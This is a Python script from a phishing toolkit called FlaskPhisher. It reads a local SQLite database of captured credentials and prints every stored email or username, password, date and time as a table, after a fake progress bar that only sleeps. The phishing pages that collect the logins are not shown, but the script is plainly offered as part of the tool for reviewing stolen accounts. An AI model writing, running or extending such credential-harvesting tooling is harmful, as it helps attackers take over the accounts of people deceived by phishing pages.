import sqlite3
from terminaltables import AsciiTable
from tqdm import tqdm
import time
import sys

# FlaskPhisher Modules
from Modules.banner import saveCreds
from Modules.screenCleaner import screenCleaner
from Modules.colorConfigs import green, reset, blue, red
# FlaskPhisher Modules End

# Table Headers
credID = (blue + "Credential ID" + reset)
user_or_mail = (blue + "Email/Username" + reset)
passwd = (blue + "Password" + reset)
date = (blue + "Date" + reset)
time0 = (blue + "Time" + reset)
#Table Headers End

table_data = []

def credentialsTable():
    try:
        # Database Configs
        db = "./db/FlaskPhisher.db"
        connection = sqlite3.connect(db)
        cursor = connection.cursor()
        # Database Configs End

        cursor.execute("SELECT * FROM flaskphisher")
        allCredentials = cursor.fetchall()
        connection.close()

        table_data = [[credID, user_or_mail, passwd, date, time0]]

        row = 0
        for i in allCredentials:
            table_data.append([allCredentials[row][0], allCredentials[row][1], allCredentials[row][2], allCredentials[row][3], allCredentials[row][4]])
            row = row + 1

        table = AsciiTable(table_data)
        return (table.table)
    except Exception as err:
        return ("[-] Error --> " + str(err))

try:
    x = credentialsTable()
    screenCleaner()
    print(green + saveCreds + reset)

    for i in tqdm(range(100), desc=(blue + "Data are processing"), disable=False, leave=False , unit="kb"):
        time.sleep(0.1)
    time.sleep(1)
    print(x)
    print(green + "\n" + "[!] Thanks for using this tool..." + "\n" + reset)
except Exception as err:
    print(red + "[-] Error Occurred --> " + blue + "{}".format(err) + reset)
    print(red + "[-] Can't run program anymore...\n[-] Quiting..." + reset)
    sys.exit()